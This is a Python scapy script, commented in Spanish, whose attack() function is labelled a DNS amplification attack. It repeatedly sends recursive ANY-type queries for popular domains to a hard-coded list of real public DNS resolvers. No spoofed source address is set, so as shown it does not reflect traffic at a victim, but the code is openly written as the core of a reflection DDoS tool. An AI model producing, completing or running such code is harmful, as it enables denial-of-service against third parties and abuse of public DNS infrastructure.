import time
import random
from scapy.all import IP, UDP, DNS, DNSQR, send

running = False

def attack():
    global running
    try:
        # Lista de servidores DNS públicos
        dnsServers = [
            "8.8.8.8",        # Google DNS
            "8.8.4.4",        # Google DNS secundario
            "1.1.1.1",        # Cloudflare DNS
            "1.0.0.1",        # Cloudflare DNS secundario
            "9.9.9.9",        # Quad9 DNS
            "149.112.112.112", # Quad9 DNS secundario
            "208.67.222.222", # OpenDNS
            "208.67.220.220", # OpenDNS secundario
            "94.140.14.14",    # AdGuard DNS
            "94.140.15.15",    # AdGuard DNS secundario
            "185.228.168.168", # CleanBrowsing DNS (seguridad familiar)
            "185.228.169.169", # CleanBrowsing DNS (seguridad familiar)
            "64.6.64.6",       # Verisign DNS
            "64.6.65.6",       # Verisign DNS secundario
            "208.67.222.220",  # OpenDNS (tercer servidor)
            "77.88.8.8",       # Yandex DNS
            "77.88.8.1",       # Yandex DNS secundario
            "185.228.28.28",   # NextDNS
            "185.228.29.29",   # NextDNS secundario
            "156.154.70.1",    # Neustar DNS
            "156.154.71.1"     # Neustar DNS secundario
        ]


        # Lista de dominios reales
        domains = [
            "google.com",
            "cloudflare.com",
            "example.com",
            "mozilla.org",
            "wikipedia.org",
            "openai.com",
            "github.com"
        ]

        # Tipos de consulta DNS comunes
        qtypes = [255]  #ANY

        #print("[INFO] Ataque DNS Amplification simulado con múltiples servidores y dominios")

        while True:
            while running:
                server = random.choice(dnsServers)
                domain = random.choice(domains)
                qtype = random.choice(qtypes)

                dnsRequest = (
                    IP(dst=server) /
                    UDP(dport=53) /
                    DNS(rd=1, qd=DNSQR(qname=domain, qtype=qtype))
                )

                send(dnsRequest, verbose=False)
                print(f"[+] Enviada consulta a {server} → {domain} (qtype={qtype})")
                time.sleep(0.3)
            time.sleep(1)

    except Exception as e:
        print(f"[ERROR] Error durante el ataque DNS: {e}")
